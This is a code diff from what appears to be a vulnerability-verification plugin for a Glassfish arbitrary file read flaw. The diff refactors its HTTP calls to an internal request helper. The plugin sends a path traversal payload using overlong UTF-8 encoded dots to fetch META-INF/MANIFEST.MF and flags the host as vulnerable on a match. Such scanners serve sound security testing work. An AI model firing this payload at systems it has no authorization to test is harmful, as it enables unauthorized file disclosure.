@@ -5,9 +5,8 @@ name: Glassfish文件任意读取漏洞
 description: Glassfish文件任意读取漏洞
 '''
 
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class Glassfish_File_Read_BaseVerify:
     def __init__(self, url):
@@ -19,7 +18,7 @@ class Glassfish_File_Read_BaseVerify:
     def run(self):
         url = self.url + '/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF'
         try:
-            req = requests.get(url, headers = self.headers, allow_redirects = False, verify=False)
+            req = request.get(url, headers = self.headers)
             if 'Version' in req.text:
                 result = "exits the Glassfish arbitrary file read vuln"
                 print('存在Glassfish文件任意读取漏洞')
